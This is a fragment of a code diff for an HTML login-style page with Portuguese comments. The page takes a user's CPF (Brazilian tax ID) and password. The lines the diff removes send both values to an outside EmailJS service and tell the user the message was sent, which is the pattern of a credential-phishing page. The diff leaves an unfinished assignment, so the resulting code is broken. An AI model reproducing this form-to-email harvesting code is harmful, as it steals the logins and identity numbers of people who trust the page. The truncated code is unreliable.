@@ -38,26 +38,7 @@
             var senha = document.getElementById("SENHA").value;
 
             // Cria um objeto com os dados do formulário
-            var formData = {
-                CPF: cpf, // Envia o valor do CPF
-                SENHA: senha // Envia o valor da senha
-            };
-
-            // Envia o formulário para o EmailJS
-            emailjs.send("service_q4yc9r6", "template_ug4bg1d", formData)
-                .then(function(response) {
-                    // Sucesso
-                    alert("Mensagem enviada com sucesso!");
-                    console.log("Resposta do EmailJS:", response);
-                }, function(error) {
-                    // Erro: Mostra mais detalhes do erro no console
-                    alert("Falha ao enviar a mensagem.");
-                    console.log("Erro ao enviar:", error);  // Detalhes do erro no console
-                });
-        });
-    </script>
-</body>
-</html>
+            var formData = 
 
 
 
